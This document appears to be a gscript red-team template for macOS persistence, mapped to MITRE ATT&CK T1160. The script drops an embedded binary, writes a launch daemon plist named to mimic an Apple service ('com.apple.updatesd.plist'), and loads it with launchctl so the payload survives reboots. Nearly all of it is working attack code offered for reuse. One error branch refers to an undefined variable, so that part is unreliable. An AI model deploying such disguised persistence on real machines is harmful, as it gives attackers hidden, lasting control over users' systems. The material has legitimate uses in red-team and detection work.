// Example gscript template
// Title: Launch Daemon Persistence
// Author: ahhh
// Purpose: Drop a sample binary and a launch daemon plist and persist it using Launch Daemon
// Gscript version: 1.0.0
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1160

//priority:90
//timeout:150

//go_import:os/user as user

//import:/private/tmp/example.macho
//import:/private/tmp/example_daemon.plist

var plist_name = "com.apple.updatesd.plist";

function Deploy() {
    console.log("Starting Launch Daemon Persistence");

    // Prep the asset
    var exBin = GetAssetAsBytes("example.macho");
    if (exBin[1] != null) {
        console.log("errors: "+exBin[1].Error());
    }
    // Prep the asset
    var exDaemon = GetAssetAsBytes("example_daemon.plist");
    if (exDaemon[1] != null) {
        console.log("errors: "+exDaemon[1].Error());
    }

    // Setup the binary
    name = "/usr/local/daemon_example";
    var dropErr = G.file.WriteFileFromBytes(name, exBin[0]);
    if (dropErr != null) {
        console.log("errors: "+dropErr.Error());
    } else {
        console.log("dropped the example binary here: "+name); 
    }

    // Setup the launch daemon
    var whoami = user.Current();
    //var home = whoami[0].HomeDir+"/";
    var location1 = "/System/Library/LaunchDaemons/" + plist_name;
    var location2 = "/Library/LaunchDaemons/" + plist_name;
    var dropErr2 = G.file.WriteFileFromBytes(location2, exDaemon[0]);
    if (dropErr2 != null) {
        console.log("errors: "+dropErr2.Error());
    } else {
        console.log("dropped the agent plist here: "+location2); 
    } 

    // Persist the daemon
    exec = G.exec.ExecuteCommand("launchctl", ["load", "-w", location2]);
    if (exec[4] == null) {
        console.log("Persisted binary using launch agent at: "+location2);
        console.log("Pid: "+exec[0]);;
        console.log("stdout: "+exec[1]);
        console.log("stderr: "+exec[2]);
        console.log("exit code: "+exec[3]);
    } else {
        console.log("go errors: "+execResp[4].Error())  ;
    }   

    console.log("Done Launch Daemon persistence");
    return true;
}
